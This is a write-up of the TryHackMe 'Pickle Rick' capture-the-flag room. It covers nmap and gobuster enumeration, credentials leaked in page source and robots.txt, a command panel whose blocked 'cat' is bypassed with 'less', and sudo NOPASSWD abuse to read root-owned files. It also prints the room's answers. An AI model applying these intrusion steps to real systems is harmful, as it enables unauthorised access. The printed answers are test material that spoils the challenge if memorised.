
# Pickle Rick - TryHackMe Writeup

This is a writeup for the "Pickle Rick" challenge on TryHackMe, you can find it [here](https://tryhackme.com/room/picklerick)

---

## Steps

### 1. Initial Reconnaissance
- Scanned the target with `nmap`:
  ```bash
  nmap -A -sV -p- [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -A -sV -p- 10.10.252.115
  ```
- Flags explained:
  - `-A`: Aggressive scan (OS detection, version detection, scripts, traceroute).
  - `-sV`: Detect service versions.
  - `-p-`: Scan all 65,535 ports.
- Results:
  ```
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  ```
- Open ports: 2 (22 and 80).

### 2. Web Enumeration
- Visited `http://[VICTIM IP]` and inspected the source code. Found a comment:
  ```
  Note to self, remember username!
  Username: R1ckRul3s
  ```
- Ran `gobuster` without extensions first:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w [WORDLIST PATH]
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.252.115 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
- Flags explained:
  - `dir`: Directory enumeration mode.
  - `-u`: Target URL.
  - `-w`: Wordlist path.
- Results:
  ```
  /assets        (Status: 301)
  /server-status (Status: 403)
  ```
- Checked `/assets`—nothing useful.
- Ran a more detailed `gobuster` scan with extensions:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w [WORDLIST PATH] -x .php,.txt
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.252.115 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt
  ```
- Additional flag:
  - `-x .php,.txt`: Check for `.php` and `.txt` file extensions.
- Results:
  ```
  /login.php     (Status: 200)
  /assets        (Status: 301)
  /portal.php    (Status: 302) [--> /login.php]
  /robots.txt    (Status: 200)
  /denied.php    (Status: 302) [--> /login.php]
  /clue.txt      (Status: 200)
  ```

### 3. Gather Clues
- Checked `robots.txt`:
  ```
  Wubbalubbadubdub
  ```
- Assumed it was the password for `login.php`.
- Read `clue.txt`:
  ```
  Look around the file system for the other ingredient.
  ```

### 4. Access the Command Panel
- Visited `http://[VICTIM IP]/login.php`, entered:
  - Username: `R1ckRul3s`
  - Password: `Wubbalubbadubdub`
- Logged in successfully to a "Command Panel" allowing command execution.

### 5. Find the First Ingredient
- Ran `ls` :
  ```
  Sup3rS3cretPickl3Ingred.txt  assets  clue.txt  denied.php  index.html  login.php  portal.php  robots.txt
  ```
- Tried `cat Sup3rS3cretPickl3Ingred.txt`:
  ```
  Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
  ```
- Used `less` instead:
  ```
  less Sup3rS3cretPickl3Ingred.txt
  ```
- Output: `mr. meeseek hair`
- First ingredient: `mr. meeseek hair`.

### 6. Privilege Check and Further Exploration
- Checked `sudo` privileges:
  ```
  sudo -l
  ```
- Output:
  ```
  User www-data may run the following commands on ip-10-10-252-115:
      (ALL) NOPASSWD: ALL
  ```
- Realized I could run any command as root without a password.

### 7. Find the Second Ingredient
- Searched for `.txt` files as root:
  ```bash
  sudo find / -name "*.txt" 2>/dev/null
  ```
- Flags explained:
  - `find /`: Search entire filesystem.
  - `-name "*.txt"`: Match files ending in `.txt`.
  - `2>/dev/null`: Suppress permission errors.
- Found `/root/3rd.txt` but no second ingredient there.
- Explored with `sudo ls`:
  ```bash
  sudo ls /home
  ```
- Output: `rick`
- Checked Rick’s directory:
  ```bash
  sudo ls /home/rick
  ```
- Found `second ingredients` (note the space).
- Read it:
  ```bash
  sudo less "/home/rick/second ingredients"
  ```
- Output: `1 jerry tear`
- Second ingredient: `1 jerry tear`.

### 8. Find the Third Ingredient
- From the earlier `find` output, checked `/root/3rd.txt`:
  ```bash
  sudo less /root/3rd.txt
  ```
- Output: `fleeb juice`
- Third ingredient: `fleeb juice`.

---

## Answers to Challenge Questions
1. **First ingredient Rick needs**: `mr. meeseek hair`
2. **Second ingredient in Rick’s potion**: `1 jerry tear`
3. **Last and final ingredient**: `fleeb juice`

---

## Tools Used
- `nmap`: Port and service enumeration.
- `gobuster`: Web directory and file enumeration.
- Browser: Manual inspection and login.

---

## Lessons Learned
- Source code comments can reveal credentials (e.g., username).
- Adding file extensions to `gobuster` uncovers hidden pages.
- Command execution panels may disable common commands like `cat`, but alternatives like `less` work.
- `sudo -l` revealing `NOPASSWD: ALL` is a golden ticket for root access.
- Spaces in filenames need quotes (e.g., `"second ingredients"`).

---
